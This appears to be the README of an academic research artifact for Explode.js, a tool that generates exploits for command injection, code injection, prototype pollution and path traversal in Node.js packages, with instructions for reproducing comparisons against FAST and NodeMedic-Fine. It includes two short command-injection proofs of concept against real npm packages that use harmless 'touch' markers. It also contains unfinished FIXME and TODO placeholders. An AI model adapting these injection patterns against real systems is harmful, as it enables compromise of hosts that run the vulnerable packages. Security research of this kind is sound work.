# Automated Exploit Generation for Node.js Packages

This artifact evaluates Explode.js, a novel tool for synthesizing exploits for Node.js applications.
By combining static analysis and symbolic execution, Explode.js generates functional exploits
that confirm the existence of command injection (CWE-78), code injection (CWE-94), prototype pollution (CWE-1321), and path traversal (CWE-22) vulnerabilities.
The repository includes all source code, reference datasets and instructions on how to build and run the experiments.
These experiments result in the tables presented in the paper, which can be used to validate the results.

# A. Getting Started

This section includes an introduction to the Explode.js tool, along with its requirements, setup instructions, and basic testing procedures for running the artifact.

## A.1. Description & Requirements

**How to access.**
The artifact is available as a persistent DOI at [10.5281/zenodo.15009157](10.5281/zenodo.15009157).

**Dependencies.**
The evaluation of this artifact does not depend on specific hardware. However, the following software and hardware specifications are recommended:

- Linux (tested with Ubuntu Ubuntu 24.04.2 LTS and Debian 10/11);
- Docker (tested with version 28.0.1);
- 32GiB RAM;
- Stable internet connection (Explode-js requires npm install to validate exploits).

**Source Code and Benchmarks.**
All source code and reference benchmarks are included in the repository and respective docker images.

**Time.**
We estimate that the time needed to run the artifact evaluation is as follows:
- Getting started: 30 minutes (approximately).
- Main experiments: 34-48 hours (approximately).

**Artifact Structure.**
The artifact is organized as follows:

```

```

The artifact includes three Docker containers: `explode-js_image.tar.gz`, `fast_image.tar.gz`, and `nodemedic_image.tar.gz`. The first container corresponds to Explode.js, our tool, while the second and third correspond to FAST and NodeMedic-Fine, the main competing tools. Each tool's experiments should be executed with its designated Docker container.

## A.2. Getting Started with Explode.js

**Setup.**
To set up the environment, load the Explode.js Docker image, `explode-js_image.tar.gz`, using the following command in the root directory of the artifact:

```sh
$ docker load < explode-js_image.tar.gz
```

**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, run Explode.js on the running example using the following commands:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js/example
$ explode-js full running-example/index.js
```

**Output.** The output of the previous command should be:

The generated exploit can be found in the file `_results/run/symbolic_test_0/literal_1.js`.

## A.3. Getting Started with FAST

**Setup.**
To setup the environment, load the FAST Docker image, `fast_image.tar.gz`, using the following command in the root directory of the artifact:

```sh
$ docker load < fast_image.tar.gz
```
**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, run FAST's running example (the package `command-exists@1.2.2`) using the following commands:

```sh
$ docker run --rm -it fast:latest bash
$ cd explode-js
$ python3 run-fast.py datasets out --packages command-exists
```

**Output.** The output of the previous command should be:

```
[*] 2 package(s) selected for benchmarking
[-] Running: command-exists@1.2.2
Running: python3 -m simurun -t os_command -X datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
[-] Running: command-exists@1.2.2
Running: python3 -m simurun -t os_command -X datasets/secbench-dataset/CWE-78/command-exists_1.2.2/src/command-exists.js

| command-exists | 1.2.2     | CWE-78 | Exited 0 |    0.838758 |     17.1162 |      17.955  | successful  | successful |
```

The output table is saved in `.csv` format as `fast-parsed-results.csv`.

**Remark:**

Importantly, FAST does not generate executable exploits. Instead, it produces a
log containing information about the vulnerable package function and the
inputs required to trigger the exploit.
Below, we provide the relevant fragment of FAST's log for the current example,
which can be found in the file `cat out/134_fast/fast-stdout.log`:

```
...

Attack Path:
==========================
/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
101     module.exports = function commandExists(commandName, callback) {
  if (!callback && typeof Promise !== 'undefined') {
    return new Promise(function(resolve, reject){
      commandExists(commandName, function(error, output){
        if (output) {
          resolve(commandName);
        } else {
          reject(error);
        }
      });
    });
  }
  if (isUsingWindows) {
    commandExistsWindows(commandName, callback);
  } else {
    commandExistsUnix(commandName, callback);
  }
};
49                  var child = exec('command -v ' + commandName +
                  ' 2>/dev/null' +
                  ' && { echo >&1 \'' + commandName + ' found\'; exit 0; }',
                  function (error, stdout, stderr) {
                      callback(null, !!stdout);
                  });
6         sink_hqbpillvul_exec(sink);
...
```

Based on the provided log, one can manually construct the following exploit:

```js
var sink = require("command-exists");
var commandName = "''; touch success #";
var callback = function(){};
sink(commandName, callback);
```

## A.4. Getting Started with *NodeMedic-Fine*

**Setup.**
To setup the environment, install the scripts necessary dependencies and load
the NodeMedic-Fine Docker image, `nodemedic_image.tar.gz`, with the following
command:

```sh
$ python3 -m pip install pandas~=2.2.3 tabulate~=0.9.0
$ docker load < nodemedic_image.tar.gz
```

**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, run NodeMedic's running example (the package `ts-process-promises@1.0.2`) using the following command:

```sh
$ python3 run-NodeMedic.py bench/datasets out --packages ts-process-promises
```

**Output.** The output of the previous command should be:

```
[*] 1 package(s) selected for benchmarking
[-] Running: ts-process-promises@1.0.2
Running: docker run -it --rm -v /Users/framos/Desktop/explode-js/out/ts-process-promises@1.0.2__nodeMedic:/nodetaint/analysisArtifacts:rw nodemedic-fine:latest --package=ts-process-promises --version=1.0.2 --mode=full

| package             | version   | cwe    | marker   |   fuzz_time |   expl_time |   total_time | taintpath   | exploit   |

```

One of the generated exploits can be found in the file `out/ts-process-promises@1.0.2__nodeMedic/poc0.js`:

```js
// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};

var PUT = require('/nodetaint/packageData/ts-process-promises/node_modules/ts-process-promises');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = {};
new PUT["exec"](x0,x1)();
} catch (e) {
	console.log(e);
}
```

# B. Main Experiments

With this artifact, our goal is to demonstrate the following claims of the paper, each corresponding to one of its main research questions:

- **Claim 1** *(RQ1 - Section 6.1): Effectiveness in Exploit Generation.*
Explode.js is more effective in generating exploits than its main competing tools (FAST[] and NodeMedic-Fine[]).

- **Claim 2** *(RQ2 - Section 6.2): Exploit Generation in the Wild.*
Explode.js is able to find new exploits for real-wold Node.js modules in the wild.

- **Claim 3** *(RQ3 - Section 6.3): Performance Evaluation.*
Explode.js is able to generate exploits in feasible time, but is less performant than its main competitor tools.

- **Claim 4** *(RQ4 - Section 6.4): Necessity of Explode.js Components.*
The core techniques of Explode.js (VISes and lazy values) are key to its effectiveness.

This section provides instructions for reproducing the experiments that support the claims of the paper.
These experiments result in the tables presented in the paper, which can be used to validate the results.

**Timeouts.** For all experiments, the analysis of each package has a predefined timeout of 10 minutes.
This parameter can affect the results produced, as different machines may experience varying numbers of timeouts.
Consequently, there may be slight variations in the results, but all claims are expected to be verified.

**Paper Discrepancies.** FIXME

## B.1. Claims 1 and 3

The goal of this section is to confirm the results presented in Sections 6.1 and 6.3 of the paper;
specifically those of Tables 3 and 6, which we reproduce below.

To reproduce the results of these tables, one must first run Explode.js, FAST, and NodeMedic-Fine in the Vulcan and SecBench.js datasets.
In the following, we explain how to do this separately for each tool.

**Table 3. [Effectiveness]**

| CWE ID   |  Total |  TP (Explode-js) |   E (Explode-js) | TP (FAST) | E (FAST) | TP (NodeMedic) | E (NodeMedic) |
|----------|--------|-----|-----|----|----|----|----|
| CWE-22   |    166 |  97 |  84 | 6 | 0 | -- | -- |
| CWE-78   |    169 | 111 |  70 | 106 | 66 | 51 | 49 |
| CWE-94   |     54 |  24 |  11 | 7 | 3 | 17 | 5 |
| CWE-1321 |    214 | 108 |  98 | 0 | 0 | -- | -- |
| Total    |    603 | 340 | 263 | 119 | 69 | 68 | 44 |

Where:

- Total indicates the total number of packages to be analyzed;
- TP (Explode.js), TP (FAST), TP (NodeMedic) refer to the number of true vulnerabilities (true positives) detected by Explode.js, FAST, and NodeMedic, respectively;
- E (Explode.js), E (FAST), E (NodeMedic) refer to the number of exploits generated by Explode.js, FAST, and NodeMedic, respectively.

NodeMedic does not detect or generate exploits for CWE-22 and CWE-1321, which correspond to path traversal and prototype pollution vulnerabilities. Hence, the dashes in the tables indicate the absence of data for these cases.

**Table 6. [Performance]**

| CWE ID   | Total (Explode.js) | Total (FAST) | Total (NodeMedic-Fine) |
|----------|---------|----------|---------|
| CWE-22   | 31.568s | 4.271 | -- |
| CWE-78   | 40.521s | 20.405 | 39.311 |
| CWE-94   | 54.873s | 5.939 | 18.824 |
| CWE-1321 | 42.112s | 19.130 | -- |
| Total    | 39.728s | 13.674 | 19.730 |

Where we place in each cell the average time that the respective tool took to
analyze the vulnerabilities of the corresponding category.
For example, in the cell (CWE-22, Explode.js), we place the average time that
Explode.js took to analyze the packages with path traversal vulnerabilities (CWE-22).


### B.1.1. Explode.js

Run the following commands:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js.sh
```

This will take approximately **10 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

The generated exploits are stored in the output dirs in `bench/datasets/CWE-{22|78|94|1321}`.
To check the exploit generated for a specific package, say the `command-exists@1.2.2` package,
run the command:

```sh
$ python3 retreive.py bench/datasets/zeroday-output apptjs
```

To generate the Explode.js results of Table 3, run:

```sh
$ python3 table_explode-js.py
```

To generate the Explode.js results of Table 6, run:

```sh
$ python3 table_explode-js_time.py
```

### B.1.2. FAST

Run the following commands:

```sh
$ cd explode-js
$ python3 run-fast.py datasets/ out && python3 table_fast.py
```

This will take approximately **7 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

As stated before, FAST does not generate executable exploits; those have to be manually put together from the output log information.
We have done that for all the generated traces in the dataset, which can be consulted in the folder `bench/datasets/fast-pocs`.
To check the exploit generated for a specific package, say the `xopen@1.0.0` package, see file `bench/datasets/fast-pocs/xopen/poc.js`.

To generate the FAST results of Table 3, run:

```sh
$ python3 table_fast.py
```

To generate the FAST results of Table 6, run:

```sh
$ python3 table_fast_time.py
```

### B.1.3. NodeMedic-Fine

Run the following command in the root of the artifact:

```sh
$ python3 run-NodeMedic.py bench/datasets out && python3 table_nodemedic.py
```

This will take approximately **5 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

The generated exploits are stored in `out/`. To check the exploit generated for a
specific package, say the `command-exists@1.2.2` package, see file `out/command-exists@1.2.2__nodeMedic/poc0.js`.

To generate the NodeMedic-Fine results of Table 3, run:

```sh
$ python3 table_nodemedic.py
```

To generate the NodeMedic-Fine results of Table 6, run:

```sh
$ python3 table_nodemedic_time.py
```

### B.1.4. Speed-up the Analysis

For the sake of time, instead of confirming the results for the entire dataset,
the reviewers can verify the results for just one specific type of vulnerability.
To this end, it is sufficient to run the main analysis script for that specific
type of vulnerability. Below, we explain how to do this for each tool.

**Explode.js** For Explode.js instead of running the command:

```sh
$ ./run_explode-js.sh`
```

Run the command specific to the targeted vulnerability type:

```sh
$ ./run_explode-js_cwe22.sh
$ ./run_explode-js_cwe78.sh
$ ./run_explode-js_cwe94.sh
$ ./run_explode-js_cwe1321.sh
```

**FAST**:

```sh
$ python3 run-fast.py datasets/ out --cwes CWE-22
$ python3 run-fast.py datasets/ out --cwes CWE-78
$ python3 run-fast.py datasets/ out --cwes CWE-94
$ python3 run-fast.py datasets/ out --cwes CWE-1321
```

**NodeMedic-Fine**:

```sh
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-78
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-94
```

## Claim 2

The goal of this section is to confirm the results presented in Section 6.2 of the paper;
specifically those of Table 5, which we reproduce below:

**Table 5. [Explode.js in the Wild]**

`[TODO]`

To reproduce the results of the table above, we provide the set of packages for which Explode.js found
new vulnerabilities in `[FIXME]` and a script to run Explode.js on these packages.
To run Explode.js on the wild packages in which new vulnerabilities were found, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_zeroday.sh
```

This will take approximately **1.5 hours**. The scripts prints to the stdout a version of the table above and the generated exploits can be found in the `bench/datasets/zeroday-output` dir.
To check the exploit generated for a specific package, say the `aaptjs` package, run:

```sh
$ python3 retreive.py bench/datasets/zeroday-output apptjs
```

To generate Table 5, run:

```sh
$ python3 table_explode-js_zeroday.py
```

A table summarizing the results should be printed to the stdout.

## Claim 4

The goal of this section is to confirm the results presented in Section 6.4 of the paper;
specifically those of Table 7, which we reproduce below:

To reproduce the results of the table above, one must first run Explode.js without VISes and Lazy Values.

**Table 7. [Explode.js Components]**

**No VIS**

| CWE ID   | Total Vulns |  TP |   E |
|----------|-------------|-----|-----|
| CWE-22   |         166 |   0 |   0 |
| CWE-78   |         169 |  60 |  44 |
| CWE-94   |          54 |   8 |   1 |
| CWE-1321 |         214 |  18 |   5 |
| Total    |         603 |  86 |  50 |

**No lazy values**

| CWE ID   |  Total Vulns |  TP |   E |
|----------|--------------|-----|-----|
| CWE-22   |          166 |   3 |   1 |
| CWE-78   |          169 |  57 |  46 |
| CWE-94   |           54 |  17 |  10 |
| CWE-1321 |          214 |  41 |  33 |
| Total    |          603 | 118 |  90 |

Where:
- Total indicates the total number of packages to be analyzed;
- TP refers to the number of true vulnerabilities detected by Explode.js when  adapted with no VISes (first table) and no lazy values (second table) respectively, and
- E refers to the number of exploits generated by Explode.js when adapted with no VISes (first table) and no lazy values (second table) respectively.

### Claim 4.1: No VISes

To execute Explode.js with no VISes, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_no-vis.sh
```

This will take approximately **2 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

After executing the scripts above, it is always possible to
obtain the table with the corresponding results by running
the command:

```sh
$ python3 table_explode-js2.py ./bench/datasets/no-vis/results.csv
```

### Claim 4.1: No Lazy Values

To execute Explode.js with no Lazy Values, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_no-lazy-values.sh
```

This will take approximately **8 hours**.  The execution was successful if a
table summarizing the results is printed to stdout at the end.

After executing the scripts above, it is always possible to
obtain the table with the corresponding results by running
the command:

```sh
$ python3 table_explode-js2.py ./bench/datasets/no-lazy-values/results.csv
```
